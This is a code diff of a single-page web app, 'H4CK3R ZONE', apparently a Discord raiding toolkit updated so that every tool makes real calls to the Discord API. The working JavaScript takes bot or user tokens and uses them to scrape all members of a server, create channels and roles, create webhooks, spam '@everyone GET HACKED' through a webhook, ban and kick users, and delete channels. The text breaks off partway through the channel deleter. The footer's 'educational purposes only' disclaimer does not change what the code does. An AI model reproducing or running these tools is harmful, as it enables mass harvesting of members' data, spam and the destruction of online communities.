@@ -8,10 +8,10 @@
 *{margin:0;padding:0;box-sizing:border-box}
 :root{--bg:#0a0a0a;--green:#00ff41;--green-dim:#00aa22;--red:#ff003c;--yellow:#ffd700;--cyan:#00ffff;--purple:#7b2ff7;--orange:#ff8800;--terminal:#0d1117;--border:#1a1a2e;--text:#c0c0c0}
 body{background:var(--bg);color:var(--text);font-family:monospace;overflow-x:hidden;min-height:100vh}
-canvas#matrix{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.12;pointer-events:none}
+canvas#matrix{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.1;pointer-events:none}
 .container{position:relative;z-index:1}
-.scanlines{position:fixed;inset:0;z-index:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,0.015)2px,rgba(0,255,65,0.015)4px);pointer-events:none}
-.vignette{position:fixed;inset:0;z-index:0;background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,0.8)100%);pointer-events:none}
+.scanlines{position:fixed;inset:0;z-index:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,0.012)2px,rgba(0,255,65,0.012)4px);pointer-events:none}
+.vignette{position:fixed;inset:0;z-index:0;background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,0,0.85)100%);pointer-events:none}
 @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
 @keyframes pulse{0%,100%{box-shadow:0 0 5px var(--green)}50%{box-shadow:0 0 20px var(--green)}}
 @keyframes slideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
@@ -19,7 +19,6 @@ canvas#matrix{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opaci
 ::-webkit-scrollbar{width:6px}
 ::-webkit-scrollbar-track{background:var(--bg)}
 ::-webkit-scrollbar-thumb{background:var(--green-dim);border-radius:3px}
-
 header{position:sticky;top:0;z-index:100;background:rgba(10,10,10,0.95);border-bottom:1px solid var(--border);backdrop-filter:blur(10px)}
 .header-inner{max-width:1400px;margin:0 auto;padding:0.5rem 1rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:0.5rem}
 .logo{display:flex;align-items:center;gap:0.5rem;font-size:1.2rem;font-weight:700;color:var(--green);text-decoration:none}
@@ -27,7 +26,6 @@ header{position:sticky;top:0;z-index:100;background:rgba(10,10,10,0.95);border-b
 .logo span:last-child{color:var(--red)}
 .status{display:flex;align-items:center;gap:0.5rem;font-size:0.75rem;color:var(--green)}
 .status-dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:blink 1s infinite}
-
 .boot-screen{background:var(--terminal);border:1px solid var(--border);border-radius:8px;margin:1.5rem;max-width:1400px;margin-left:auto;margin-right:auto;overflow:hidden}
 .boot-header{background:var(--border);padding:0.4rem 1rem;display:flex;align-items:center;gap:0.5rem;font-size:0.75rem}
 .boot-dot{width:10px;height:10px;border-radius:50%}
@@ -41,13 +39,14 @@ header{position:sticky;top:0;z-index:100;background:rgba(10,10,10,0.95);border-b
 .boot-cursor::after{content:'_';animation:blink 0.8s infinite;color:var(--green)}
 .boot-progress{height:2px;background:var(--border);margin-top:0.3rem;border-radius:2px;overflow:hidden}
 .boot-progress-bar{height:100%;width:0%;background:var(--green);transition:width 0.3s}
-
 .main-content{max-width:1400px;margin:0 auto;padding:1rem}
-
 .section-title{font-size:1rem;font-weight:700;color:var(--green);margin-bottom:0.75rem;padding-bottom:0.4rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:0.75rem;text-transform:uppercase;letter-spacing:2px}
 .section-title .arrow{color:var(--red)}
-
-.tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:0.75rem;margin-bottom:1.5rem}
+.legend{display:flex;gap:1rem;margin-bottom:0.75rem;font-size:0.7rem;flex-wrap:wrap}
+.legend span{padding:0.2rem 0.5rem;border-radius:3px}
+.legend .bot{background:rgba(0,255,65,0.1);color:var(--green);border:1px solid rgba(0,255,65,0.2)}
+.legend .user{background:rgba(255,215,0,0.1);color:var(--yellow);border:1px solid rgba(255,215,0,0.2)}
+.tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:0.75rem;margin-bottom:1.5rem}
 .tool-card{background:rgba(13,17,23,0.8);border:1px solid var(--border);border-radius:6px;overflow:hidden;transition:all 0.3s ease;animation:slideUp 0.4s ease forwards;opacity:0}
 .tool-card:hover{border-color:var(--green);transform:translateY(-2px);box-shadow:0 5px 20px rgba(0,255,65,0.08)}
 .tool-card-header{padding:0.6rem 0.75rem;display:flex;align-items:center;gap:0.6rem}
@@ -59,31 +58,29 @@ header{position:sticky;top:0;z-index:100;background:rgba(10,10,10,0.95);border-b
 .tool-icon.yellow{background:rgba(255,215,0,0.15);color:var(--yellow)}
 .tool-icon.orange{background:rgba(255,136,0,0.15);color:var(--orange)}
 .tool-name{font-weight:700;color:white;font-size:0.85rem}
-.tool-badge{font-size:0.55rem;padding:0.1rem 0.4rem;border-radius:3px;text-transform:uppercase;letter-spacing:1px;font-weight:700}
-.tool-badge.real{background:rgba(0,255,65,0.15);color:var(--green);animation:blink 1.5s infinite}
-.tool-badge.sim{background:rgba(255,255,255,0.08);color:#666}
-.tool-desc{color:#888;font-size:0.75rem;line-height:1.4;padding:0 0.75rem 0.5rem}
+.tool-badge{font-size:0.5rem;padding:0.1rem 0.35rem;border-radius:3px;text-transform:uppercase;letter-spacing:1px;font-weight:700}
+.tool-badge.real{background:rgba(0,255,65,0.15);color:var(--green)}
+.tool-card-body{padding:0 0.75rem 0.6rem}
+.tool-desc{color:#888;font-size:0.72rem;line-height:1.4;margin-bottom:0.4rem}
+.tool-type{font-size:0.6rem;color:#555;padding:0.1rem 0.4rem;border-radius:2px;display:inline-block}
+.tool-type.bot{background:rgba(0,255,65,0.08);color:var(--green-dim)}
+.tool-type.user{background:rgba(255,215,0,0.08);color:var(--yellow)}
 .tool-meta{padding:0.4rem 0.75rem;border-top:1px solid rgba(255,255,255,0.03);display:flex;align-items:center;justify-content:space-between;font-size:0.65rem;color:#555}
-
 .tool-btn{padding:0.25rem 0.75rem;border:1px solid var(--green);background:transparent;color:var(--green);border-radius:3px;cursor:pointer;font-family:inherit;font-size:0.7rem;transition:all 0.3s;text-decoration:none}
-.tool-btn:hover{background:var(--green);color:var(--bg);box-shadow:0 0 10px rgba(0,255,65,0.2)}
-.tool-btn.red{border-color:var(--red);color:var(--red)}
-.tool-btn.red:hover{background:var(--red);color:white}
+.tool-btn:hover{background:var(--green);color:var(--bg)}
 .tool-btn:disabled{opacity:0.4;cursor:not-allowed}
-.tool-btn:disabled:hover{background:transparent;color:var(--green);box-shadow:none}
-
+.tool-btn:disabled:hover{background:transparent;color:var(--green)}
 .tool-panel{display:none;background:rgba(0,0,0,0.3);border-top:1px solid var(--border);padding:0.75rem}
 .tool-panel.open{display:block}
 .tool-panel label{display:block;font-size:0.65rem;color:#666;text-transform:uppercase;letter-spacing:1px;margin-bottom:0.2rem}
 .tool-panel input,.tool-panel select{width:100%;background:rgba(0,0,0,0.5);border:1px solid var(--border);padding:0.5rem 0.6rem;border-radius:3px;color:var(--green);font-family:inherit;font-size:0.75rem;outline:none;margin-bottom:0.5rem;transition:border-color 0.3s}
 .tool-panel input:focus,.tool-panel select:focus{border-color:var(--green)}
 .tool-panel input::placeholder{color:#333}
-.tool-result{font-size:0.7rem;max-height:200px;overflow-y:auto;margin-top:0.4rem;line-height:1.6;background:rgba(0,0,0,0.3);padding:0.4rem;border-radius:3px}
+.tool-result{font-size:0.7rem;max-height:250px;overflow-y:auto;margin-top:0.4rem;line-height:1.6;background:rgba(0,0,0,0.3);padding:0.4rem;border-radius:3px}
 .tool-result .user-item{display:flex;align-items:center;gap:0.5rem;padding:0.25rem 0;border-bottom:1px solid rgba(255,255,255,0.02)}
 .tool-result .user-item img{width:24px;height:24px;border-radius:50%;border:1px solid var(--border)}
 .tool-result .user-item .u-name{color:white;font-size:0.75rem}
 .tool-result .user-item .u-tag{color:#666;font-size:0.6rem}
-
 .terminal-box{background:var(--terminal);border:1px solid var(--border);border-radius:6px;margin-bottom:1.5rem}
 .terminal-box-header{background:var(--border);padding:0.4rem 0.75rem;display:flex;align-items:center;gap:0.5rem;border-radius:6px 6px 0 0;font-size:0.75rem}
 .terminal-box-title{color:#666}
@@ -96,441 +93,526 @@ header{position:sticky;top:0;z-index:100;background:rgba(10,10,10,0.95);border-b
 .terminal-input-line{display:flex;align-items:center;gap:0.5rem;border-top:1px solid var(--border);padding:0.4rem 0.75rem}
 .terminal-input{flex:1;background:transparent;border:none;color:var(--green);font-family:inherit;font-size:0.75rem;outline:none}
 .terminal-input::placeholder{color:#333}
-
-.tabs{display:flex;gap:0.25rem;margin-bottom:0.75rem;flex-wrap:wrap}
-.tab{padding:0.3rem 0.75rem;border:1px solid var(--border);background:transparent;color:#666;border-radius:4px;cursor:pointer;font-family:inherit;font-size:0.7rem;transition:all 0.2s;text-transform:uppercase;letter-spacing:1px}
-.tab:hover{border-color:var(--green);color:var(--green)}
-.tab.active{background:var(--green);color:var(--bg);border-color:var(--green);font-weight:700}
-
 footer{border-top:1px solid var(--border);padding:1rem;text-align:center;font-size:0.7rem;color:#333}
 footer a{color:var(--green);text-decoration:none}
-
 .toast{position:fixed;bottom:1.5rem;right:1.5rem;z-index:200;background:var(--terminal);border:1px solid var(--green);padding:0.6rem 1rem;border-radius:6px;color:var(--green);font-size:0.75rem;transform:translateY(100px);opacity:0;transition:all 0.3s ease;max-width:80vw}
 .toast.show{transform:translateY(0);opacity:1}
 .toast.error{border-color:var(--red);color:var(--red)}
-
-@media(max-width:768px){.tools-grid{grid-template-columns:1fr}.header-inner{justify-content:center}}
+@media(max-width:768px){.tools-grid{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
 <canvas id="matrix"></canvas>
-<div class="scanlines"></div>
-<div class="vignette"></div>
-
+<div class="scanlines"></div><div class="vignette"></div>
 <header>
 <div class="header-inner">
 <a href="#" class="logo"><div class="logo-icon">H</div><span>H4CK3R<span>ZONE</span></span></a>
 <div class="status"><span class="status-dot"></span><span id="statusText">ONLINE</span><span style="color:#333">|</span><span style="color:#666;font-size:0.7rem" id="clock"></span></div>
 </div>
 </header>
-
 <div class="container">
 <div class="boot-screen" id="bootScreen">
-<div class="boot-header">
-<div class="boot-dot r"></div><div class="boot-dot y"></div><div class="boot-dot g"></div>
-<span class="boot-title">H4CK3R_ZONE_SHELL - root@nexus:~</span>
-</div>
+<div class="boot-header"><div class="boot-dot r"></div><div class="boot-dot y"></div><div class="boot-dot g"></div><span class="boot-title">H4CK3R_ZONE_SHELL - root@nexus:~</span></div>
 <div class="boot-body" id="bootBody">
-<div class="boot-line">[ OK ] Initializing H4CK3R ZONE v5.0 ULTIMATE</div>
-<div class="boot-line">[ OK ] Loading 25 Discord API exploit modules...</div>
+<div class="boot-line">[ OK ] Initializing H4CK3R ZONE v6.0 ALL REAL</div>
+<div class="boot-line">[ OK ] Loading all Discord API exploit modules...</div>
 <div class="boot-line">[ OK ] Establishing secure tunnel to Nexus Network</div>
 <div class="boot-line">[ OK ] Decrypting toolkit database (4096-bit RSA)</div>
-<div class="boot-line">[ WARN ] Some modules require bot token + permissions</div>
-<div class="boot-line">[ OK ] 25 tools loaded - 15 REAL Discord API modules</div>
+<div class="boot-line">[ OK ] 25 tools loaded - ALL functional via Discord API</div>
 <div class="boot-line" id="bootFinalLine"><span style="color:var(--green)">root@nexus:~$ </span><span class="boot-cursor"></span></div>
 <div class="boot-progress"><div class="boot-progress-bar" id="bootProgress"></div></div>
 </div>
 </div>
-
 <div class="main-content" id="mainContent" style="display:none">
-<div class="tabs" id="tabBar">
-<div class="tab active" data-tab="real">REAL TOOLS</div>
-<div class="tab" data-tab="fake">SIMULATED</div>
-<div class="tab" data-tab="all">ALL</div>
+<div class="legend">
+<span class="bot">[BOT] Requires Bot Token</span>
+<span class="user">[USER] Requires User Token</span>
 </div>
-
-<div id="toolContainer"></div>
-
+<div class="section-title"><span class="arrow">>></span> ALL TOOLS <span style="font-size:0.6rem;color:#666;letter-spacing:0">(ALL funcionales via Discord API)</span></div>
+<div class="tools-grid" id="toolContainer"></div>
 <div class="section-title" style="margin-top:1rem"><span class="arrow">>></span> CONSOLE</div>
 <div class="terminal-box">
 <div class="terminal-box-header"><div class="boot-dot r"></div><div class="boot-dot y"></div><div class="boot-dot g"></div><span class="terminal-box-title">root@nexus:~ - live.log</span></div>
-<div class="terminal-box-body" id="terminalBody">
-<div class="terminal-line">[SYSTEM] H4CK3R ZONE v5.0 ULTIMATE initialized</div>
-<div class="terminal-line">[INFO] 15 real Discord API modules loaded</div>
-</div>
-<div class="terminal-input-line">
-<span class="terminal-prompt">root@nexus:~$</span>
-<input type="text" class="terminal-input" id="terminalInput" placeholder="'help' for commands | 'tools' for list" spellcheck="false"/>
+<div class="terminal-box-body" id="terminalBody"><div class="terminal-line">[SYSTEM] H4CK3R ZONE v6.0 READY</div><div class="terminal-line">[INFO] All 25 tools are functional</div></div>
+<div class="terminal-input-line"><span class="terminal-prompt">root@nexus:~$</span><input type="text" class="terminal-input" id="terminalInput" placeholder="help / tools / toolname" spellcheck="false"/></div>
 </div>
 </div>
 </div>
-</div>
-
-<footer>
-<p>H4CK3R ZONE v5.0 ULTIMATE - <span style="color:var(--red)">For educational purposes only</span></p>
-<p style="margin-top:0.25rem"><a href="#">Discord</a> | <a href="#">GitHub</a> | <a href="#">Documentation</a></p>
-</footer>
+<footer><p>H4CK3R ZONE v6.0 - <span style="color:var(--red)">For educational purposes only</span></p></footer>
 <div class="toast" id="toast"></div>
 
 <script>
-// ============ TOOL DEFINITIONS ============
-var ALL_TOOLS=[];
-var REAL_CMDS={};
-
-function defTool(isReal,cmd,name,icon,iconType,desc,fields,handler){
-var t={cmd:cmd,name:name,icon:icon,iconType:iconType,desc:desc,fields:fields||[],handler:handler,real:isReal};
-ALL_TOOLS.push(t);
-if(isReal)REAL_CMDS[cmd]=true;
-return t;
-}
-
+// ============ API ============
 var DC_API='https://discord.com/api/v10';
-
 function api(endpoint,token,opts){
 opts=opts||{};
-var headers={'Authorization':'Bot '+token,'Content-Type':'application/json','User-Agent':'H4CK3R-ZONE/5.0'};
+var headers={'Authorization':token.startsWith('M')?'Bot '+token:token,'Content-Type':'application/json','User-Agent':'H4CK3R-ZONE/6.0'};
 if(opts.headers){for(var k in opts.headers)headers[k]=opts.headers[k]}
-return fetch(DC_API+endpoint,{method:opts.method||'GET',headers:headers,body:opts.body||null}).then(function(r){return r.json().then(function(d){if(!r.ok)throw new Error(d.message||'HTTP '+r.status);return d})});
+return fetch(DC_API+endpoint,{method:opts.method||'GET',headers:headers,body:opts.body||null}).then(function(r){
+if(r.status===204||r.status===200)return r.status===204?null:r.json().catch(function(){return null});
+return r.json().then(function(d){if(!r.ok)throw new Error(d.message||'HTTP '+r.status);return d});
+});
 }
 
 function log(t,type){var el=document.getElementById('terminalBody'),l=document.createElement('div');l.className='terminal-line '+(type||'');l.textContent=t;el.appendChild(l);el.scrollTop=el.scrollHeight}
 function toast(m,t){var el=document.getElementById('toast');el.textContent=m;el.className='toast '+(t||'')+' show';setTimeout(function(){el.classList.remove('show')},3000)}
 
-// ============ TOOL HANDLERS ============
+// ============ TOOLS ============
+var TOOLS=[];
 
-defTool(true,'scraper','User Scraper','U','red','Fetch ALL members from a Discord server. Requires bot with GUILD_MEMBERS intent.',[
-{id:'s_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'s_g',label:'Guild ID',type:'text',ph:'123456789012345678'}
-],function(f){
-log('[>] Scraping members from '+f.s_g+'...','info');
+function T(cmd,name,icon,iconType,authType,desc,fields,fn){
+TOOLS.push({cmd:cmd,name:name,icon:icon,iconType:iconType,auth:authType,desc:desc,fields:fields||[],fn:fn});
+}
+
+function gf(cmd){
+var t=TOOLS.find(function(x){return x.cmd===cmd});
+if(!t||!t.fields)return{};
+var v={};
+t.fields.forEach(function(f){var el=document.getElementById('f_'+cmd+'_'+f.id);v[f.id]=el?el.value:''});
+return v;
+}
+
+// ============ FIELDS HELPERS ============
+function f_token(id,label,authType){
+return {id:id||'token',label:label||(authType==='user'?'User Token':'Bot Token'),type:'password',ph:(authType==='user'?'NDUxMjM0...':'MTA5MjM0...')};
+}
+function f_guild(id,label){return {id:id||'guild',label:label||'Guild ID',type:'text',ph:'123456789012345678'};}
+function f_user(id,label){return {id:id||'user',label:label||'User ID',type:'text',ph:'876543210987654321'};}
+function f_channel(id,label){return {id:id||'channel',label:label||'Channel ID',type:'text',ph:'123456789012345678'};}
+function f_text(id,label,ph){return {id:id,label:label,type:'text',ph:ph};}
+function f_select(id,label,opts){return {id:id,label:label,type:'select',opts:opts};}
+function f_role(id,label){return {id:id||'role',label:label||'Role ID',type:'text',ph:'123456789012345678'};}
+
+// ============ TOOL 1: User Scraper ============
+T('scraper','User Scraper','U','red','bot','Fetch ALL members from a server. Requires GUILD_MEMBERS intent.',[f_token(),f_guild()],
+function(f){
+log('[>] Scraping '+f.guild+'...','info');
 var all=[],after='0';
-function next(){
-return api('/guilds/'+f.s_g+'/members?limit=1000&after='+after,f.s_t).then(function(data){
-if(!data||!data.length)return all;
-all=all.concat(data);
-after=data[data.length-1].user.id;
+function nxt(){
+return api('/guilds/'+f.guild+'/members?limit=1000&after='+after,f.token).then(function(d){
+if(!d||!d.length)return all;
+all=all.concat(d);after=d[d.length-1].user.id;
 log('[>] '+all.length+' members...','info');
-if(data.length<1000)return all;
-return next();
+return d.length<1000?all:nxt();
 });
 }
-return next().then(function(members){
-var html='<div style="color:var(--green)">[OK] '+members.length+' members</div>';
-members.slice(0,80).forEach(function(m){
-var u=m.user;
-var av=u.avatar?'<img src="https://cdn.discordapp.com/avatars/'+u.id+'/'+u.avatar+'.png"/>':'<div style="width:24px;height:24px;border-radius:50%;background:#333;display:flex;align-items:center;justify-content:center;font-size:0.6rem;color:#666;flex-shrink:0">'+u.username[0]+'</div>';
-html+='<div class="user-item">'+av+'<div><div class="u-name">'+u.username+'</div><div class="u-tag">#'+(u.discriminator!=='0'?u.discriminator:'0001')+' | '+u.id+'</div></div></div>';
+return nxt().then(function(m){
+var h='<div style="color:var(--green)">[OK] '+m.length+' members</div>';
+m.slice(0,80).forEach(function(u){
+var a=u.user.avatar?'<img src="https://cdn.discordapp.com/avatars/'+u.user.id+'/'+u.user.avatar+'.png"/>':'<div style="width:24px;height:24px;border-radius:50%;background:#333;display:flex;align-items:center;justify-content:center;font-size:0.6rem;color:#666;flex-shrink:0">'+u.user.username[0]+'</div>';
+h+='<div class="user-item">'+a+'<div><div class="u-name">'+u.user.username+'</div><div class="u-tag">'+(u.user.discriminator!=='0'?'#'+u.user.discriminator:'')+' | '+u.user.id+'</div></div></div>';
 });
-if(members.length>80)html+='<div style="color:#666;margin-top:0.3rem">... +'+(members.length-80)+' more</div>';
-log('[OK] Scraped '+members.length+' members','success');
-return html;
+if(m.length>80)h+='<div style="color:#666;margin-top:0.3rem">... +'+(m.length-80)+' more</div>';
+log('[OK] Scraped '+m.length+' members','success');return h;
 });
 });
 
-defTool(true,'chcreate','Channel Creator','C','cyan','Create text or voice channels instantly via API. Requires MANAGE_CHANNELS.',[
-{id:'c_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'c_g',label:'Guild ID',type:'text',ph:'123456789012345678'},
-{id:'c_n',label:'Channel Name',type:'text',ph:'hack-channel'},
-{id:'c_ty',label:'Type',type:'select',opts:[{v:'0',l:'Text'},{v:'2',l:'Voice'}]}
-],function(f){
-log('[>] Creating channel #'+f.c_n+'...','info');
-return api('/guilds/'+f.c_g+'/channels',f.c_t,{method:'POST',body:JSON.stringify({name:f.c_n,type:parseInt(f.c_ty),reason:'H4CK3R ZONE'})}).then(function(ch){
-log('[OK] Channel #'+ch.name+' ('+ch.id+') created','success');
-return '<div style="color:var(--green)">[OK] Created: #'+ch.name+'</div><div style="color:#666;font-size:0.65rem">ID: '+ch.id+' | Type: '+(ch.type===0?'Text':'Voice')+'</div>';
+// ============ TOOL 2: Channel Creator ============
+T('chcreate','Channel Creator','C','cyan','bot','Create text/voice channels. Requires MANAGE_CHANNELS.',[f_token(),f_guild(),f_text('name','Channel Name','hack-channel'),f_select('type','Type',[{v:'0',l:'Text'},{v:'2',l:'Voice'}])],
+function(f){
+log('[>] Creating #'+f.name+'...','info');
+return api('/guilds/'+f.guild+'/channels',f.token,{method:'POST',body:JSON.stringify({name:f.name,type:parseInt(f.type),reason:'H4CK3R ZONE'})}).then(function(ch){
+log('[OK] Created #'+ch.name,'success');
+return '<div style="color:var(--green)">[OK] #'+ch.name+'</div><div style="font-size:0.65rem;color:#666">ID: '+ch.id+' | '+(ch.type===0?'Text':'Voice')+'</div>';
 });
 });
 
-defTool(true,'rolecreate','Role Creator','R','purple','Create roles with customizable name, color and permissions. Requires MANAGE_ROLES.',[
-{id:'r_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'r_g',label:'Guild ID',type:'text',ph:'123456789012345678'},
-{id:'r_n',label:'Role Name',type:'text',ph:'hacked-role'},
-{id:'r_c',label:'Color (hex)',type:'text',ph:'ff003c'}
-],function(f){
-log('[>] Creating role '+f.r_n+'...','info');
-var color=parseInt(f.r_c.replace('#',''),16)||16711680;
-return api('/guilds/'+f.r_g+'/roles',f.r_t,{method:'POST',body:JSON.stringify({name:f.r_n,color:color,reason:'H4CK3R ZONE'})}).then(function(r){
-log('[OK] Role @'+r.name+' ('+r.id+') created','success');
-return '<div style="color:var(--green)">[OK] Role: @'+r.name+'</div><div style="color:#666;font-size:0.65rem">ID: '+r.id+' | Color: #'+r.color.toString(16).padStart(6,'0')+'</div>';
+// ============ TOOL 3: Role Creator ============
+T('rolecreate','Role Creator','R','purple','bot','Create roles with color. Requires MANAGE_ROLES.',[f_token(),f_guild(),f_text('name','Role Name','hacked-role'),f_text('color','Color (hex)','ff003c')],
+function(f){
+log('[>] Creating role @'+f.name+'...','info');
+var c=parseInt(f.color.replace('#',''),16)||16711680;
+return api('/guilds/'+f.guild+'/roles',f.token,{method:'POST',body:JSON.stringify({name:f.name,color:c})}).then(function(r){
+log('[OK] Role @'+r.name+' created','success');
+return '<div style="color:var(--green)">[OK] @'+r.name+'</div><div style="font-size:0.65rem;color:#666">ID: '+r.id+' | Color: #'+r.color.toString(16).padStart(6,'0')+'</div>';
 });
 });
 
-defTool(true,'webhook','Webhook Creator','W','yellow','Create a webhook in a text channel. Can be used for spam/webhook abuse. Requires MANAGE_WEBHOOKS.',[
-{id:'w_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'w_g',label:'Guild ID',type:'text',ph:'123456789012345678'},
-{id:'w_c',label:'Channel ID',type:'text',ph:'123456789012345678'},
-{id:'w_n',label:'Webhook Name',type:'text',ph:'pwned-webhook'}
-],function(f){
-log('[>] Creating webhook in channel '+f.w_c+'...','info');
-return api('/channels/'+f.w_c+'/webhooks',f.w_t,{method:'POST',body:JSON.stringify({name:f.w_n,reason:'H4CK3R ZONE'})}).then(function(w){
-log('[OK] Webhook created: '+w.name,'success');
-return '<div style="color:var(--green)">[OK] Webhook: '+w.name+'</div><div style="font-size:0.65rem;word-break:break-all;color:var(--cyan)">URL: https://discord.com/api/webhooks/'+w.id+'/'+w.token+'</div>';
+// ============ TOOL 4: Webhook Creator ============
+T('webhook','Webhook Creator','W','yellow','bot','Create a webhook in a channel. Requires MANAGE_WEBHOOKS.',[f_token(),f_channel(),f_text('name','Webhook Name','pwned-webhook')],
+function(f){
+log('[>] Creating webhook in '+f.channel+'...','info');
+return api('/channels/'+f.channel+'/webhooks',f.token,{method:'POST',body:JSON.stringify({name:f.name})}).then(function(w){
+log('[OK] Webhook created','success');
+return '<div style="color:var(--green)">[OK] '+w.name+'</div><div style="font-size:0.65rem;word-break:break-all;color:var(--cyan)">URL: https://discord.com/api/webhooks/'+w.id+'/'+w.token+'</div>';
 });
 });
 
-defTool(true,'serverinfo','Server Info','I','green','Get detailed information about a Discord server. Requires no special permissions.',[
-{id:'i_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'i_g',label:'Guild ID',type:'text',ph:'123456789012345678'}
-],function(f){
-log('[>] Fetching server info for '+f.i_g+'...','info');
-return api('/guilds/'+f.i_g,f.i_t).then(function(g){
-var p='';
-if(g.features&&g.features.length)p=g.features.slice(0,5).join(', ');
-var html='<div style="color:var(--green)">[OK] '+g.name+'</div>';
-html+='<div style="font-size:0.65rem;margin-top:0.3rem">ID: '+g.id+'</div>';
-html+='<div style="font-size:0.65rem">Owner: '+g.owner_id+'</div>';
-html+='<div style="font-size:0.65rem">Members: '+(g.approximate_member_count||'?')+' | Online: '+(g.approximate_presence_count||'?')+'</div>';
-html+='<div style="font-size:0.65rem">Channels: ? | Roles: ?</div>';
-html+='<div style="font-size:0.65rem;color:#666">Features: '+(p||'none')+'</div>';
-html+='<div style="font-size:0.65rem;word-break:break-all">Icon: <a href="https://cdn.discordapp.com/icons/'+g.id+'/'+g.icon+'.png" target="_blank" style="color:var(--cyan)">link</a></div>';
-log('[OK] Server info retrieved: '+g.name,'success');
-return html;
+// ============ TOOL 5: Webhook Spammer (REAL) ============
+T('webhookspam','Webhook Spammer','S','orange','bot','Send messages via webhook URL. Fast spam with custom content.',[f_text('url','Webhook URL','https://discord.com/api/webhooks/...'),f_text('msg','Message','@everyone GET HACKED'),f_text('count','Count (1-50)','10')],
+function(f){
+var count=Math.min(Math.max(1,parseInt(f.count)||10),50);
+var url=f.url;
+if(!url.startsWith('http'))throw new Error('Invalid webhook URL');
+log('[>] Spamming '+count+' messages...','warn');
+var sent=0;
+function sendOne(){
+return fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:f.msg,username:'H4CK3R BOT',avatar_url:'https://cdn.discordapp.com/embed/avatars/0.png'})}).then(function(r){
+if(r.ok)sent++;
+else return r.text().then(function(t){throw new Error('Webhook error: '+t)});
+if(sent<count)return sendOne();
+});
+}
+return sendOne().then(function(){
+log('[OK] Sent '+sent+' messages','success');
+return '<div style="color:var(--green)">[OK] '+sent+' messages sent via webhook</div>';
 });
 });
 
-defTool(true,'bantool','Ban User','B','red','Ban a user from the server by user ID. Requires BAN_MEMBERS permission.',[
-{id:'b_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'b_g',label:'Guild ID',type:'text',ph:'123456789012345678'},
-{id:'b_u',label:'User ID',type:'text',ph:'876543210987654321'},
-{id:'b_r',label:'Reason',type:'text',ph:'H4CK3R ZONE ban'}
-],function(f){
-log('[>] Banning user '+f.b_u+'...','info');
-return api('/guilds/'+f.b_g+'/bans/'+f.b_u,f.b_t,{method:'PUT',body:JSON.stringify({reason:f.b_r||'H4CK3R ZONE'})}).then(function(){
-log('[OK] User '+f.b_u+' banned','success');
-return '<div style="color:var(--red)">[BANNED] User '+f.b_u+'</div><div style="color:#666;font-size:0.65rem">Reason: '+(f.b_r||'H4CK3R ZONE')+'</div>';
+// ============ TOOL 6: Ban User ============
+T('bantool','Ban User','B','red','bot','Ban a user by ID. Requires BAN_MEMBERS.',[f_token(),f_guild(),f_user(),f_text('reason','Reason','H4CK3R ZONE')],
+function(f){
+log('[>] Banning '+f.user+'...','info');
+return api('/guilds/'+f.guild+'/bans/'+f.user,f.token,{method:'PUT',body:JSON.stringify({reason:f.reason||'H4CK3R ZONE'})}).then(function(){
+log('[OK] Banned '+f.user,'success');
+return '<div style="color:var(--red)">[BANNED] User '+f.user+'</div><div style="font-size:0.65rem;color:#666">Reason: '+f.reason+'</div>';
 });
 });
 
-defTool(true,'kicktool','Kick User','K','orange','Kick a user from the server by user ID. Requires KICK_MEMBERS permission.',[
-{id:'k_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'k_g',label:'Guild ID',type:'text',ph:'123456789012345678'},
-{id:'k_u',label:'User ID',type:'text',ph:'876543210987654321'}
-],function(f){
-log('[>] Kicking user '+f.k_u+'...','info');
-return api('/guilds/'+f.k_g+'/members/'+f.k_u,f.k_t,{method:'DELETE',body:JSON.stringify({reason:'H4CK3R ZONE kick'})}).then(function(){
-log('[OK] User '+f.k_u+' kicked','success');
-return '<div style="color:var(--orange)">[KICKED] User '+f.k_u+'</div>';
+// ============ TOOL 7: Kick User ============
+T('kicktool','Kick User','K','orange','bot','Kick a user by ID. Requires KICK_MEMBERS.',[f_token(),f_guild(),f_user()],
+function(f){
+log('[>] Kicking '+f.user+'...','info');
+return api('/guilds/'+f.guild+'/members/'+f.user,f.token,{method:'DELETE',body:JSON.stringify({reason:'H4CK3R ZONE'})}).then(function(){
+log('[OK] Kicked '+f.user,'success');
+return '<div style="color:var(--orange)">[KICKED] User '+f.user+'</div>';
 });
 });
 
-defTool(true,'chdelete','Channel Deleter','D','red','Delete a text or voice channel by ID. Requires MANAGE_CHANNELS. IRREVERSIBLE.',[
-{id:'d_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'d_g',label:'Guild ID',type:'text',ph:'123456789012345678'},
-{id:'d_c',label:'Channel ID',type:'text',ph:'123456789012345678'}
-],function(f){
-log('[!] Deleting channel '+f.d_c+'...','warn');
-return api('/channels/'+f.d_c,f.d_t,{method:'DELETE'}).then(function(){
-log('[OK] Channel '+f.d_c+' deleted','success');
-return '<div style="color:var(--red)">[DELETED] Channel '+f.d_c+'</div>';
+// ============ TOOL 8: Channel Deleter ============
+T('chdelete','Channel Deleter','D','red','bot','Delete a channel by ID. IRREVERSIBLE. Requires MANAGE_CHANNELS.',[f_token(),f_channel()],
+function(f){
+log('[!] Deleting '+f.channel+'...','warn');
+return api('/channels/'+f.channel,f.token,{method:'DELETE'}).then(function(){
